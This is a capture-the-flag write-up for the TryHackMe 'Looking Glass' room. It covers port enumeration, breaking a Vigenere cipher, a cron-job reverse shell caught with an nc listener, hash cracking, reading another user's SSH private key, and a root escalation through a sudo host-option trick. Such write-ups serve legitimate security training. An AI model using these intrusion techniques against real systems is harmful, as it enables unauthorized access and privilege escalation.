[Home](../../index.md)

# TryHackMe: Looking Glass

https://tryhackme.com/room/lookingglass

---
## Enumeration

Port scans

When you scan this machine, you get a ridiculous number of open ports.  Below is a VERY small excerpt.

```
13885/tcp open  unknown          syn-ack                      
13886/tcp open  unknown          syn-ack            
13887/tcp open  unknown          syn-ack
13888/tcp open  unknown          syn-ack                      
13889/tcp open  unknown          syn-ack            
13890/tcp open  unknown          syn-ack
13891/tcp open  unknown          syn-ack                      
13892/tcp open  unknown          syn-ack            
13893/tcp open  unknown          syn-ack
13894/tcp open  ucontrol         syn-ack                      
13895/tcp open  unknown          syn-ack            
13896/tcp open  unknown          syn-ack
13897/tcp open  unknown          syn-ack                      
13898/tcp open  unknown          syn-ack            
13899/tcp open  unknown          syn-ack
13900/tcp open  unknown          syn-ack                      
13901/tcp open  unknown          syn-ack            
13902/tcp open  unknown          syn-ack
13903/tcp open  unknown          syn-ack                      
13904/tcp open  unknown          syn-ack            
13905/tcp open  unknown          syn-ack
13906/tcp open  unknown          syn-ack                      
13907/tcp open  unknown          syn-ack            
13908/tcp open  unknown          syn-ack
13909/tcp open  unknown          syn-ack                      
13910/tcp open  unknown          syn-ack            
13911/tcp open  unknown          syn-ack
13912/tcp open  unknown          syn-ack                      
13913/tcp open  unknown          syn-ack            
13914/tcp open  unknown          syn-ack
```

When we scan a small subset with services and scripts, we can see they are all running `Dropbear sshd (protocol 2.0)`

```
┌──(kali㉿kali)-[~/tryhackme/lookingglass]
└─$ sudo nmap -p 13965-13977 -sV -sC 10.10.68.249  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-20 11:14 EST
Nmap scan report for 10.10.68.249
Host is up (0.20s latency).

PORT      STATE SERVICE VERSION
13965/tcp open  ssh     Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
13966/tcp open  ssh     Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
13967/tcp open  ssh     Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
13968/tcp open  ssh     Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
13969/tcp open  ssh     Dropbear sshd (protocol 2.0)

etc...
```

You can get a brief description of Dropbear [here](https://matt.ucc.asn.au/dropbear/dropbear.html).  It's a "relatively small SSH server and client" that is "particularly useful for "embedded"-type Linux (or other Unix) systems".

When we try to connect to one of the ports, we get either `Higher` or `Lower` as a response.

```
┌──(kali㉿kali)-[~/tryhackme/lookingglass]
└─$ ssh -p 13970 10.10.68.249           
The authenticity of host '[10.10.68.249]:13970 ([10.10.68.249]:13970)' can't be established.
RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.68.249]:13970' (RSA) to the list of known hosts.
Higher
Connection to 10.10.68.249 closed.
```

Continuing with the theme of "Everything is upside down here" from the previous box, `Higher` means Lower, and `Lower` means Higher.

```
┌──(kali㉿kali)-[~/tryhackme/lookingglass]
└─$ ssh -p 10000 10.10.68.249       
The authenticity of host '[10.10.68.249]:10000 ([10.10.68.249]:10000)' can't be established.
RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:18: [hashed name]
    ~/.ssh/known_hosts:19: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.68.249]:10000' (RSA) to the list of known hosts.
Lower
Connection to 10.10.68.249 closed.
```

---
## Cipher

When we finally find the right port, we get the following.

```
You've found the real service.
Solve the challenge to get access to the box
Jabberwocky
'Mdes mgplmmz, cvs alv lsmtsn aowil
Fqs ncix hrd rxtbmi bp bwl arul;
Elw bpmtc pgzt alv uvvordcet,
Egf bwl qffl vaewz ovxztiql.

'Fvphve ewl Jbfugzlvgb, ff woy!
Ioe kepu bwhx sbai, tst jlbal vppa grmjl!
Bplhrf xag Rjinlu imro, pud tlnp
Bwl jintmofh Iaohxtachxta!'

Oi tzdr hjw oqzehp jpvvd tc oaoh:
Eqvv amdx ale xpuxpqx hwt oi jhbkhe--
Hv rfwmgl wl fp moi Tfbaun xkgm,
Puh jmvsd lloimi bp bwvyxaa.

Eno pz io yyhqho xyhbkhe wl sushf,
Bwl Nruiirhdjk, xmmj mnlw fy mpaxt,
Jani pjqumpzgn xhcdbgi xag bjskvr dsoo,
Pud cykdttk ej ba gaxt!

Vnf, xpq! Wcl, xnh! Hrd ewyovka cvs alihbkh
Ewl vpvict qseux dine huidoxt-achgb!
Al peqi pt eitf, ick azmo mtd wlae
Lx ymca krebqpsxug cevm.

'Ick lrla xhzj zlbmg vpt Qesulvwzrr?
Cpqx vw bf eifz, qy mthmjwa dwn!
V jitinofh kaz! Gtntdvl! Ttspaj!'
Wl ciskvttk me apw jzn.

'Awbw utqasmx, tuh tst zljxaa bdcij
Wph gjgl aoh zkuqsi zg ale hpie;
Bpe oqbzc nxyi tst iosszqdtz,
Eew ale xdte semja dbxxkhfe.
Jdbr tivtmi pw sxderpIoeKeudmgdstd
Enter Secret:
```

This looks like some kind of alphabet cipher.  I tried ROT13 and its variants to no avail.  Substitution Cipher solver tools gave nothing as well.  (If you look up the Jabberwocky poem, it becomes obvious this is not straight substitution)

I ended up landing on Vigenere cipher tools.  [boxentriq](https://www.boxentriq.com/code-breaking/) has a brute-force tool that was able to give me the answer after I increased the key length in the settings.

The end of the poem has the secret.  When entered into the SSH session,

```
Enter Secret:
jabberwock:<redacted>
Connection to 10.10.68.249 closed.
```

SSH into the machine, the user flag is right there, but it's backwards.  Annoying, but nothing compared to the ports.

---
## Lateral Movement

Running through Linux Privesc techniques, we see that there is a cron job that runs the script from `jabberwock`'s `/home` directory as `tweedledum` on reboot.

```
jabberwock@looking-glass:~$ cat /etc/crontab

...usual stuff...

#
@reboot tweedledum bash /home/jabberwock/twasBrillig.sh
```

`sudo -l` also reveals that we can reboot at will.

```
jabberwock@looking-glass:~$ sudo -l
Matching Defaults entries for jabberwock on looking-glass:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jabberwock may run the following commands on looking-glass:
    (root) NOPASSWD: /sbin/reboot
```

That's all we need to send a shell as `tweedledum` back to us at reboot.

Set up our listener, edit the script, and reboot.

```
jabberwock@looking-glass:~$ vim twasBrillig.sh
jabberwock@looking-glass:~$ cat twasBrillig.sh

jabberwock@looking-glass:~$ sudo reboot
Connection to 10.10.68.249 closed by remote host.
Connection to 10.10.68.249 closed.
```

```
┌──(kali㉿kali)-[~/tryhackme/lookingglass]
└─$ nc -lvnp 4444                      
listening on [any] 4444 ...
connect to [10.13.18.7] from (UNKNOWN) [10.10.68.249] 46102
bash: cannot set terminal process group (892): Inappropriate ioctl for device
bash: no job control in this shell
tweedledum@looking-glass:~$
```

## More Lateral Movement

We have 2 files here.

```
tweedledum@looking-glass:~$ cat humptydumpty.txt
cat humptydumpty.txt
dcfff5eb40423f055a4cd0a8d7ed39ff6cb9816868f5766b4088b9e9906961b9
7692c3ad3540bb803c020b3aee66cd8887123234ea0c6e7143c0add73ff431ed
28391d3bc64ec15cbb090426b04aa6b7649c3cc85f11230bb0105e02d15e3624
b808e156d18d1cecdcc1456375f8cae994c36549a07c8c2315b473dd9d7f404f
fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f6
b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b
tweedledum@looking-glass:~$ cat poem.txt
cat poem.txt
     'Tweedledum and Tweedledee
      Agreed to have a battle;
     For Tweedledum said Tweedledee
      Had spoiled his nice new rattle.

     Just then flew down a monstrous crow,
      As black as a tar-barrel;
     Which frightened both the heroes so,
      They quite forgot their quarrel.'
```

`humptydumpty.txt` is a number of fixed-length lines of hex.  This sounds like hashes.  Using rainbow tables (I used crackstation.net), you get a message with the first 7 lines.

```
maybe
one
of
these
is
the
password
```

The 8th line is not found.

Unfortunately, after trying all of these we get nowhere. (NOTE: You have to upgrade your shell first)

```
tweedledum@looking-glass:~$ su humptydumpty
su humptydumpty
Password: maybe

su: Authentication failure
tweedledum@looking-glass:~$ su humptydumpty
su humptydumpty
Password: one

su: Authentication failure
tweedledum@looking-glass:~$ su humptydumpty
su humptydumpty
Password: of

su: Authentication failure

...so on
```

Let's look at that 8th line.  Putting this line alone into [CyberChef](https://gchq.github.io/CyberChef/) suggests this is simple hex-to-text.

```
the password is <redacted>
```

```
weedledum@looking-glass:~$ su humptydumpty
su humptydumpty
Password: <redacted>

humptydumpty@looking-glass:/home/tweedledum$ id
id
uid=1004(humptydumpty) gid=1004(humptydumpty) groups=1004(humptydumpty)
```

---
## Even More Lateral Movement

This starts with something we could have pursued earlier.  Let's at the `/home` directory.

```
humptydumpty@looking-glass:/home$ ls -al
ls -al
total 32
drwxr-xr-x  8 root         root         4096 Jul  3  2020 .
drwxr-xr-x 24 root         root         4096 Jul  2  2020 ..
drwx--x--x  6 alice        alice        4096 Jul  3  2020 alice
drwx------  3 humptydumpty humptydumpty 4096 Jan 20 17:57 humptydumpty
drwxrwxrwx  5 jabberwock   jabberwock   4096 Jan 20 17:31 jabberwock
drwx------  5 tryhackme    tryhackme    4096 Jul  3  2020 tryhackme
drwx------  3 tweedledee   tweedledee   4096 Jul  3  2020 tweedledee
drwx------  2 tweedledum   tweedledum   4096 Jul  3  2020 tweedledum
```

Notice that `alice` and `jabberwock`'s directories are executable.  What this means is that we can `cd` to these directories.  This means we can attempt to list the contents of each directory.  

While this doesn't help us find files that we don't know about, it DOES help us find files that we might be familiar with.

```
humptydumpty@looking-glass:/home$ ls /home/alice
ls /home/alice
ls: cannot open directory '/home/alice': Permission denied
humptydumpty@looking-glass:/home$ cd /home/alice
cd /home/alice
humptydumpty@looking-glass:/home/alice$ ls
ls
ls: cannot open directory '.': Permission denied
humptydumpty@looking-glass:/home/alice$ cd .ssh
cd .ssh
humptydumpty@looking-glass:/home/alice/.ssh$ ls
ls
ls: cannot open directory '.': Permission denied
humptydumpty@looking-glass:/home/alice/.ssh$ cat id_rsa
cat id_rsa
<redacted>
```

For some reason (probably owned by `humptydumpty`) it has let us `cat` out `alice`'s id_rsa, which we can use to SSH as `alice`.

Copy/Paste this into a file on our machine, change permissions, and `ssh` with the key file.

```
┌──(kali㉿kali)-[~/tryhackme/lookingglass]
└─$ vim alice_id_rsa             
                                                                                                                                                            
┌──(kali㉿kali)-[~/tryhackme/lookingglass]
└─$ chmod 400 alice_id_rsa                      
                                                                                                                                                            
┌──(kali㉿kali)-[~/tryhackme/lookingglass]
└─$ ssh alice@10.10.68.249 -i alice_id_rsa 
Last login: Fri Jul  3 02:42:13 2020 from 192.168.170.1
alice@looking-glass:~$
```

---
## Privilege Escalation (FINALLY)

Not much here.

```
alice@looking-glass:~$ ls
kitten.txt
alice@looking-glass:~$ cat kitten.txt
She took her off the table as she spoke, and shook her backwards and forwards with all her might.

The Red Queen made no resistance whatever; only her face grew very small, and her eyes got large and green: and still, as Alice went on shaking her, she kept on growing shorter—and fatter—and softer—and rounder—and—


—and it really was a kitten, after all.
```

So let's start enumerating as usual.

Eventually we find that there is a file in `/etc/sudoers.d` for `alice` and it contains a command.

```
alice@looking-glass:~$ ls /etc/sudoers.d
README  alice  jabberwock  tweedles
alice@looking-glass:~$ cat /etc/sudoers.d/alice 
alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
```

This means that `alice` can run `sudo /bin/bash` on the host `ssalg-gnikool`.

Fortunately, `sudo` has a switch for this.

```
alice@looking-glass:~$ sudo -h ssalg-gnikool /bin/bash
sudo: unable to resolve host ssalg-gnikool
root@looking-glass:~# id
uid=0(root) gid=0(root) groups=0(root)
root@looking-glass:~# cat /root/root.txt
<redacted>
```